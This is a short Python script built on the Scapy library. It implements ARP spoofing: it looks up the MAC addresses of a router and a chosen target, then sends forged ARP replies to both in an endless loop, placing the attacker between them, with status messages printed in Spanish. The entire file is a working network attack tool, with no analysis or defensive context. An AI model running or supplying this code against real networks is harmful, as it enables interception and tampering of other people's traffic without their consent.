from scapy.all import *
from time import sleep
import sys, os

class Spoofer:
    def __init__(self):
        self.router_ip = None
        self.router_mac = None
        self.target_ip = None
        self.target_mac = None 


    def set_router_ip(self,rip):
        self.router_ip = rip

    def set_target_ip(self,rmac):
        self.target_ip = rmac

    def spoof(self):
        send(ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac, psrc=self.target_ip))
        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.router_ip))

    def request_mac(self,ip):
        #disable print
        sys.stdout = open(os.devnull,'w')
        
        resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=5)
        
        #enable print
        sys.stdout = sys.__stdout__
        if resp != None:
            res = str(resp[ARP][0][0].hwsrc)
        else:
            res = -1

        return res
        
    def begin_spoof(self):
        if self.router_ip != None and self.target_ip != None:
            print("INTENTANDO OBTENER DIRECCIÖN MAC DE " + str(self.router_ip) + "...")
            self.router_mac = self.request_mac(self.router_ip)
            print("HECHO!!")
            print("INTENTANDO OBTENER DIRECCIÓN MAC DE " + str(self.target_ip) + " ...")
            self.target_mac = self.request_mac(self.target_ip)
            print("HECHO!!")
            print("SPOOFING:")
            if self.router_mac != None and self.target_mac != None and self.router_mac != -1 and self.router_ip != -1:
                while True:
                    self.spoof()
            else:
                print("Error: No se han podido obtener las direcciones físicas de los dispositivos solicitados.")

        else:
            print("Error: Faltan direcciónes ip. Asegurese de que ha configurado una target_ip y router_ip")
